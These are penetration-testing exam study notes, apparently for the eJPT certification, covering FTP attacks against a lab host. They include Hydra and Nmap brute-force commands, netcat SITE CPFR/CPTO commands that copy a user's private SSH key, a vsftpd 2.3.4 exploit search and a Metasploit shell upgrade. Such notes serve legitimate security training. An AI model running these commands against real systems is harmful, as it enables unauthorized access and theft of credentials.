## FTP - p21

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

We can verify if the anonymous login is enabled by using this Nmap command.
```
nmap 10.10.10.1 -p 21 —script ftp-anon
```


An example of a brute-force attack on an FTP port with Hydra.
```
hydra -L listausername.txt -P listapassword.txt 10.10.10.1 ftp
```
An example of a brute-force attack on an FTP port with Nmap.
```
nmap 10.10.10.1 —script ftp-brute —script-args userdb=listausername.txt -p 21
```
We can connect to the FTP service using username and password by executing this command: 
```
ftp 10.10.10.1
```
Netcat can be used to move files to and from a target machine through the ftp channel.
```
nc 10.10.10.1 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### METASPLOIT
```
type:auxiliary portscanner
type:auxiliary ftp_version
type:auxiliary name:ftp_login
type:auxiliary name:ftp anonymous
```

### Linux - Exploiting FTP Server (VSFTPD)

vsftpd version 2.3.4 is a FTP server version that gained notoriety for its vulnerability.
```
msfconsole
search vsftpd
```
Once we obtained access to the target machine, we can use this Metasploit module to elevate the normal shell to a Meterpreter one.
```
use post/multi/manage/shell_to_meterpreter
```
